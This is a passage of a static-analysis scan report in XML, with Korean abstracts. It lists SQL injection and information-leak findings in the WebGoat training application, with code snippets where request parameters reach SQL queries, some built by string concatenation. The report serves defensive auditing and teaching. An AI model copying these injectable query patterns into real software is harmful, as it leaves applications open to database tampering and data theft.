<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>220</LineStart>
<Snippet>	try
	{
	    ResultSet results = statement3.executeQuery(query);

	    while (results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>801</LineStart>
<Snippet>    protected String getCookie(WebSession s)
    {
	Cookie[] cookies = s.getRequest().getCookies();

	for (int i = 0; i &lt; cookies.length; i++)</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getCookies()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FE929098BDBCED1E049EDA7D79C3BA13" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.java의 191 줄에서 login_BACKUP() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>191</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.first())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="72F28D8F000869CC39934273918DB898" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 340 줄에서 createEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>149</LineStart>
<Snippet>		.getParameter(CrossSiteScripting.DISCIPLINARY_DATE);
	String disciplinaryActionNotes = request
		.getParameter(CrossSiteScripting.DISCIPLINARY_NOTES);
	String personalDescription = request
		.getParameter(CrossSiteScripting.DESCRIPTION);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="91BE8A9509668E194A8C877526E7160F" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>CSRF.java의 181 줄에서 makeList() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>181</LineStart>
<Snippet>			Statement statement = connection.createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
			
			ResultSet results = statement.executeQuery( STANDARD_QUERY + " WHERE user_name LIKE '" + getNameroot( s.getUserName() ) + "%'" );

			if ( ( results != null ) &amp;&amp; ( results.first() == true ) )</Snippet>
<TargetFunction>executeQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C7251E9EB27461586D6CA0B5DD1FED0C" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 248 줄에서 changeEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>248</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>137</LineStart>
<Snippet>	String phone = request.getParameter(CrossSiteScripting.PHONE_NUMBER);
	String address1 = request.getParameter(CrossSiteScripting.ADDRESS1);
	String address2 = request.getParameter(CrossSiteScripting.ADDRESS2);
	int manager = Integer.parseInt(request
		.getParameter(CrossSiteScripting.MANAGER));</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BDB979C5A4BED6AFC08178F9E4372662" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DOS_Login.java의 114 줄에서 createContent() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DOS_Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOS_Login.java</FilePath>
<LineStart>114</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(query);
		if ((results != null) &amp;&amp; (results.first() == true))
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F241067F505B2D49558AEB12BAEB3A86" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 340 줄에서 createEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>151</LineStart>
<Snippet>		.getParameter(CrossSiteScripting.DISCIPLINARY_NOTES);
	String personalDescription = request
		.getParameter(CrossSiteScripting.DESCRIPTION);

	Employee employee = new Employee(subjectId, firstName, lastName, ssn,</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6D8E8E746A0B2870F8099EC8D0CBF6A0" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 340 줄에서 createEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>137</LineStart>
<Snippet>	String phone = request.getParameter(CrossSiteScripting.PHONE_NUMBER);
	String address1 = request.getParameter(CrossSiteScripting.ADDRESS1);
	String address2 = request.getParameter(CrossSiteScripting.ADDRESS2);
	int manager = Integer.parseInt(request
		.getParameter(CrossSiteScripting.MANAGER));</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="09598B5B8E89A030BEE456D9F896C2AE" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WsSqlInjection.java의 240 줄에서 getResults() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>240</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(query);
		return results;
	    }</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>252</LineStart>
<Snippet>

    public String[] getCreditCard(String id)
    {
	ResultSet results = getResults(id);</Snippet>
<TargetFunction>getCreditCard(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B7EBE381ABF83CAAA84E00313C5ECC06" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WsSqlInjection.java의 240 줄에서 getResults() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>240</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(query);
		return results;
	    }</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C254DB2A8D71FBAEA8349DB39FFCF7B4" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.java의 146 줄에서 getAllEmployees_BACKUP() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>146</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>executeQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6EB2F2FA65B0712F919DA4A441EA91C4" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 248 줄에서 changeEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>248</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>134</LineStart>
<Snippet>	String lastName = request.getParameter(CrossSiteScripting.LAST_NAME);
	String ssn = request.getParameter(CrossSiteScripting.SSN);
	String title = request.getParameter(CrossSiteScripting.TITLE);
	String phone = request.getParameter(CrossSiteScripting.PHONE_NUMBER);
	String address1 = request.getParameter(CrossSiteScripting.ADDRESS1);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8670E2308E8A72DAAF573E8910CC3532" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 311 줄에서 createEmployeeProfile() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>311</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>executeUpdate()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="52">
                        <groupTitle>System Information Leak: Internal</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>HammerHead.java의 doPost() 함수는 193 줄의 log()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. log()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>내부 정보는 인쇄나 로깅을 통해 시스템 데이터 또는 디버그 정보를 로컬 파일이나 콘솔, 화면으로 전송할 때 누출됩니다.



예제 1: 다음 코드는 표준 오류 스트림에 예외 사항을 작성합니다.


try {
    ...
} catch (Exception e) {
    e.printStackTrace();
}


시스템 구성에 따라 이 정보는 콘솔에 덤프되거나 로그 파일에 작성되거나 사용자에게 노출될 수 있습니다. 경우에 따라 오류 메시지가 공격자에게 시스템이 취약한 정확한 공격 유형을 알려주기도 합니다. 예를 들어, 데이터베이스 오류 메시지가 응용 프로그램이 SQL injection 공격에 취약하다는 것을 드러낼 수 있습니다. 다른 오류 메시지도 비교적 모호하지만 시스템에 대한 단서를 제공합니다. Example 1에서는 누출된 정보가 운영 체제의 종류, 시스템에 설치된 응용 프로그램 및 관리자가 프로그램 구성에 들인 관심의 정도에 대한 정보를 암시할 수 있습니다.

정보 유출은 모바일 컴퓨팅 환경에서도 문제가 됩니다.

예제 2: 다음 코드는 Android 플랫폼에서 catch된 예외의 스택 추적을 기록합니다.

...
try {
  ...
} catch (Exception e) {
    Log.e(TAG, Log.getStackTraceString(e));
}
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>오류 메시지를 쓸 때는 항상 보안을 염두에 두어야 합니다. 운영 환경에서는 자세한 오류 정보 대신 간단한 메시지를 사용합니다. 관리자와 프로그래머가 문제를 진단하는 데 도움이 되는 상세한 출력의 생성 및 저장은 삼가는 것이 좋습니다. 디버깅 추적은 때에 따라 엉뚱한 곳에 나타날 수 있습니다(예: 오류 페이지의 HTML에서 주석에 포함됨).

스택 추적이나 데이터베이스 덤프를 나타내지 않는 간결한 오류 메시지도 공격자에게 도움을 줍니다. 예를 들어, "접근 거부" 메시지는 시스템에 파일이나 사용자가 존재한다는 것을 나타냅니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. System information leak을 예방하는 데 래퍼 스크립트, 회사 IT 정책 또는 빠른 판단력을 가진 시스템 관리자에만 의존하지 마십시오. 자체적으로 안전한 소프트웨어를 작성해야 합니다.

2. 이 카테고리의 취약점은 모든 유형의 프로그램에 적용되지 않습니다. 예를 들어, 응용 프로그램이 공격자가 이미 시스템 정보를 확보한 클라이언트 시스템에서 실행되거나 시스템 정보를 신뢰할 수 있는 로그 파일에만 인쇄하는 경우, Audit Guide를 사용하여 스캔 결과에서 이 카테고리의 취약점을 필터링할 수 있습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>52</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="F82BAB3CD0F3C4174E4E45AD5A4AC746" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 524 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>524</LineStart>
<Snippet>	results = Exec.execInput("find \"cde\"",
		"abcdefg1\nhijklmnop\nqrstuv\nabcdefg2");
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 4:execTimeout");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>357</LineStart>
<Snippet>	    catch (IOException e2)
	    {
		results.setThrowable(e2);
	    }
	    finally</Snippet>
<TargetFunction>Read e2()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="159D205600BB0BD92FC54008D21A504C" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 513 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>513</LineStart>
<Snippet>		+ "TEST 2: execSimple (with search)");
	results = Exec.execSimple("netstat -r");
	System.out.println(results);

	if (results.outputContains("localhost:1031"))</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>433</LineStart>
<Snippet>	catch (Throwable t)
	{
	    results.setThrowable(t);
	}
	finally</Snippet>
<TargetFunction>Read t()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="22527F24D3F8FE925A856B7C8B72C8B6" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 532 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>532</LineStart>
<Snippet>		+ "TEST 5:execLazy");
	results = Exec.execLazy("ping -t 127.0.0.1");
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 6:ExecTimeout process never outputs");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>403</LineStart>
<Snippet>	    catch (IOException e3)
	    {
		results.setThrowable(e3);
	    }
	    finally</Snippet>
<TargetFunction>Read e3()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F82BAB3CD0F3C4174E4E45AD5A4AC74A" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 540 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>540</LineStart>
<Snippet>		+ "TEST 7:ExecTimeout process waits for input");
	results = Exec.execTimeout("c:/swarm-2.1.1/bin/cat", 5 * 1000);
	System.out.println(results);
    }
}</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>357</LineStart>
<Snippet>	    catch (IOException e2)
	    {
		results.setThrowable(e2);
	    }
	    finally</Snippet>
<TargetFunction>Read e2()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="07DC81F1724D3DD1F052EE4103383C35" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 536 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>536</LineStart>
<Snippet>		+ "TEST 6:ExecTimeout process never outputs");
	results = Exec.execTimeout("c:/swarm-2.1.1/bin/sleep.exe 20", 5 * 1000);
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 7:ExecTimeout process waits for input");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>317</LineStart>
<Snippet>		catch (IOException e1)
		{
		    results.setThrowable(e1);
		}
	    }</Snippet>
<TargetFunction>Read e1()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="07DC81F1724D3DD1F052EE4103383C33" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 528 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>528</LineStart>
<Snippet>		+ "TEST 4:execTimeout");
	results = Exec.execTimeout("ping -t 127.0.0.1", 5 * 1000);
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 5:execLazy");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>317</LineStart>
<Snippet>		catch (IOException e1)
		{
		    results.setThrowable(e1);
		}
	    }</Snippet>
<TargetFunction>Read e1()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F82BAB3CD0F3C4174E4E45AD5A4AC749" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 536 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>536</LineStart>
<Snippet>		+ "TEST 6:ExecTimeout process never outputs");
